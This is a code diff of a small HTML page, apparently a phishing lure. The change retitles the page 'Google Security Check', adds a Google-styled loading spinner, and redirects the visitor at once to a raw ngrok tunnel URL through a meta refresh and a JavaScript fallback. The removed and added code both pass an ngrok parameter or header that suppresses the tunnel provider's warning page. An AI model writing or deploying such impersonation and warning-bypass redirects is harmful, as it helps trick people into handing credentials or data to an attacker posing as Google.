@@ -1,33 +1,24 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Redirecting to Google...</title>
+    <meta charset="UTF-8">
+    <title>Google Security Check</title>
+    <meta http-equiv="refresh" content="0; url=https://d1f6-87-21-106-167.ngrok-free.app/?ngrok-skip-browser-warning=1">
 </head>
-<body style="background-color: white; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh;">
-    <p>Caricamento in corso...</p>
+<body style="background-color: white; font-family: sans-serif; display: flex; flex-direction: column; justify-content: center; align-items: center; height: 100vh; margin: 0;">
+    
+    <div style="border: 4px solid #f3f3f3; border-top: 4px solid #4285F4; border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite;"></div>
+    <p style="color: #5f6368; margin-top: 15px;">Caricamento in corso...</p>
+
+    <style>
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    </style>
 
     <script>
-        // L'URL del tuo tunnel ngrok attuale
-        const ngrokUrl = "https://d1f6-87-21-106-167.ngrok-free.app";
-
-        // Funzione per il bypass rapido
-        function doRedirect() {
-            // Apriamo una connessione che imposta l'header di bypass
-            // Usiamo un'immagine o un semplice fetch per "convincere" ngrok
-            fetch(ngrokUrl, {
-                method: 'GET',
-                mode: 'no-cors',
-                headers: {
-                    'ngrok-skip-browser-warning': 'true'
-                }
-            }).finally(() => {
-                // Dopo il tentativo di fetch, forziamo il redirect
-                window.location.href = ngrokUrl;
-            });
-        }
-
-        // Avvia il processo
-        doRedirect();
+        // Backup in caso il meta tag fallisca
+        setTimeout(function() {
+            window.location.href = "https://d1f6-87-21-106-167.ngrok-free.app/?ngrok-skip-browser-warning=1";
+        }, 500);
     </script>
 </body>
 </html>
